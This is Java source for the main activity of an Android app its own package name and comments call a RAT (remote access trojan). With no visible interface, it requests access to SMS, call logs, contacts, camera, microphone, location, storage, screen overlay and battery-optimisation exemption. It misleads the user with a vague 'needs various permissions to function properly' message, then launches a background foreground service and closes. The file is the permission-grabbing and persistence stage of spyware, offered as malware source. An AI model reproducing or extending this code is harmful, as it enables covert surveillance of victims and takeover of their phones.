package com.fly0rakoon.rat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ForegroundService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_CODE = 101;
    private static final int BATTERY_OPTIMIZATION_CODE = 102;
    
    // All permissions needed for the RAT
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        
        // Storage permissions
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        
        // Location permissions
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        
        // Camera and microphone
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        
        // Contacts
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        
        // SMS
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        
        // Phone and call logs
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
        
        // System permissions
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };
    
    // Android 13+ specific permissions
    private static final String[] ANDROID_13_PERMISSIONS = {
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.NEARBY_WIFI_DEVICES
    };
    
    // Android 12+ specific permissions
    private static final String[] ANDROID_12_PERMISSIONS = {
        Manifest.permission.BLUETOOTH_SCAN,
        Manifest.permission.BLUETOOTH_CONNECT,
        Manifest.permission.ACCESS_FINE_LOCATION
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Set a very simple layout (optional)
        // setContentView(R.layout.activity_main);
        
        // Start permission request process
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        // Add base permissions
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Add Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : ANDROID_13_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }
        
        // Add Android 12+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            for (String permission : ANDROID_12_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            // Show rationale dialog for dangerous permissions
            if (shouldShowRequestPermissionRationale(permissionsToRequest)) {
                Toast.makeText(this, 
                    "This app needs various permissions to function properly. Please grant them when prompted.", 
                    Toast.LENGTH_LONG).show();
            }
            
            // Request permissions
            ActivityCompat.requestPermissions(
                this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE
            );
        } else {
            // All permissions already granted
            checkSpecialPermissions();
        }
    }
    
    private boolean shouldShowRequestPermissionRationale(List<String> permissions) {
        for (String permission : permissions) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                return true;
            }
        }
        return false;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            StringBuilder deniedPermissions = new StringBuilder();
            boolean someDenied = false;
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    someDenied = true;
                    deniedPermissions.append("\n• ").append(getPermissionSimpleName(permissions[i]));
                }
            }
            
            if (someDenied) {
                Toast.makeText(this, 
                    "Some permissions were denied:" + deniedPermissions.toString() + 
                    "\nYou can grant them later in App Settings.", 
                    Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
            }
            
            // Check for special permissions (overlay, battery optimization)
            checkSpecialPermissions();
        }
    }
    
    private String getPermissionSimpleName(String permission) {
        if (permission.contains(".")) {
            String[] parts = permission.split("\\.");
            return parts[parts.length - 1].replace("_", " ");
        }
        return permission;
    }
    
    private void checkSpecialPermissions() {
        // Check overlay permission (for Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            }
        }
        
        // Check battery optimization (for Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
                return;
            }
        }
        
        // All permissions checked, start service
        startServiceAndFinish();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show();
                }
            }
            // Continue to next permission
            checkSpecialPermissions();
        }
        
        if (requestCode == BATTERY_OPTIMIZATION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Toast.makeText(this, "Battery optimization disabled", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Battery optimization still enabled", Toast.LENGTH_SHORT).show();
                }
            }
            // All permissions handled, start service
            startServiceAndFinish();
        }
    }
    
    private void startServiceAndFinish() {
        // Start the foreground service
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Show a final message
        Toast.makeText(this, "Service started in background", Toast.LENGTH_SHORT).show();
        
        // Finish activity
        finish();
    }
}
